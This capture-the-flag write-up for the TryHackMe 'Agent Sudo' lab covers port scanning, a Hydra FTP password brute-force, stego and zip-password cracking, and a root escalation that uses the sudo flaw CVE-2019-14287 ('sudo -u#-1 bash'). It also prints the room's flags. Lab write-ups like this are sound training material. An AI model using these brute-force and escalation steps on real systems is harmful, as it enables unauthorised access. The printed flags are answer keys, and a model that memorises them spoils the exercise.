# Agent Sudo


## Task 1
Deploy the machine
```
export IP=10.10.133.118
```

## Task 2
Enumerate

1. How many open ports?         
There are 3 open ports:
```bash
jeffrowell@kali:~/Documents/TryHackMe/agentSudo$ nmap -sC -sV -Pn -n $IP -oN nmap/initial.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 00:29 MDT
Nmap scan report for 10.10.133.118
Host is up (0.15s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.46 seconds
```


2. How you redirect yourself to a secret page?
```
User-Agent
```
In particular, we get a secret message page when supplying `C` as the user-agent:
```bash
jeffrowell@kali:~/Documents/TryHackMe/agentSudo$ curl -L --header "User-Agent: C" http://$IP
Attention chris, <br><br>
Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>
From,<br>
Agent R
```

3. What is the agent name?
From the secret message above, the agent name is `chris`.

## Task 3
Hash cracking and brute-force
1. FTP password
We know the user is `chris` so lets use `hydra` and `rockyou.txt` to brute-force the password:
```bash
jeffrowell@kali:~/Documents/TryHackMe/agentSudo$ hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://$IP
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-15 00:50:28
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.133.118:21/
[STATUS] 143.00 tries/min, 143 tries in 00:01h, 14344256 to do in 1671:50h, 16 active
[21][ftp] host: 10.10.133.118   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-15 00:52:18
```

2. Zip file password     
```
alien
```
Download 3 files from FTP resource, and doing some recon on the files we can see that it looks like `cutie.png` has a text file inside of it:
```bash
jeffrowell@kali:~/Documents/TryHackMe/agentSudo/ftp$ strings cutie.png | tail
d: ]
ZT%Q
p7a4u
^[=&
IEND
To_agentR.txt
W\_z#
2a>=
To_agentR.txt
EwwT
```
Extract the files from the images using `binwalk`:
```bash
jeffrowell@kali:~/Documents/TryHackMe/agentSudo/ftp$ binwalk -e cutie.png
DECIMAL       HEXADECIMAL     DESCRIPTION
 --------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
Inside the zip we have another archive that is password protected, and an empty `To_agentR.txt` file. We can use `zip2john` to convert the zip archive to a hash that `john` can work with, then crack the password:
```bash
jeffrowell@kali:~/Documents/TryHackMe/agentSudo/ftp$ /opt/JohnTheRipper/run/zip2john 8702.zip > zip_hash
jeffrowell@kali:~/Documents/TryHackMe/agentSudo/ftp/_cutie.png.extracted$ /opt/JohnTheRipper/run/john zip_hash
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 8 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 59 candidates buffered for the current salt, minimum 64 needed for performance.
Proceeding with wordlist:/opt/JohnTheRipper/run/password.lst, rules:Wordlist
alien            (8702.zip/To_agentR.txt)
1g 0:00:00:03 DONE 2/3 (2020-05-15 20:52) 0.2958g/s 15750p/s 15750c/s 15750C/s 123456..faithfaith
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

3. steg password      
```
area51
```  
Now that we have the zip password, unzip the `8702.zip` archive and the `To_agentR` file is populated with data now:
```bash
jeffrowell@kali:~/Documents/TryHackMe/agentSudo/ftp/_cutie.png.extracted$ cat To_agentR.txt
Agent C,
We need to send the picture to 'QXJlYTUx' as soon as possible!
By,
Agent R
jeffrowell@kali:~/Documents/TryHackMe/agentSudo/ftp/_cutie.png.extracted$ echo 'QXJlYTUx' | base64 -d
Area51
```

4. Who is the other agent (in full name)?
```
james
```
Now that we have the steg password, we can use `steghide` to extract data out of the other image from the FTP server:
```bash
jeffrowell@kali:~/Documents/TryHackMe/agentSudo/ftp$ steghide extract -sf cute-alien.jpg
Enter passphrase:
wrote extracted data to "message.txt".
jeffrowell@kali:~/Documents/TryHackMe/agentSudo/ftp$ cat message.txt
Hi james,
Glad you find this message. Your login password is hackerrules!
Don't ask me why the password look cheesy, ask agent R who set this password for you.
Your buddy,
chris
```

5. SSH password
```
hackerrules!
```

## Task 4
Capture the user flag

1. What is the user flag?
```bash
james@agent-sudo:~$ cat user_flag.txt
b03d975e8c92a7c04146cfa7a5a313c7
```

2. What is the incident of the photo called?
```
Roswell alien autopsy
```

## Task 5
Privelege escalation

1. CVE number for the escalation
Output from running sudo:
```bash
james@agent-sudo:/$ sudo -l
[sudo] password for james:
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```
```
CVE-2019-14287
```

2. What is the root flag?
```
b53a02f55b57d4439e3341834d70c062
```
```bash
james@agent-sudo:/$ sudo -u#-1 bash
root@agent-sudo:/# id
uid=0(root) gid=1000(james) groups=1000(james)
root@agent-sudo:~# cd /root
root@agent-sudo:/root# ls
root.txt
root@agent-sudo:/root# cat root.txt
To Mr.hacker,
Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.
Your flag is
b53a02f55b57d4439e3341834d70c062
By,
DesKel a.k.a Agent R
```

3. (Bonus) Who is Agent R?
```
DesKel
```
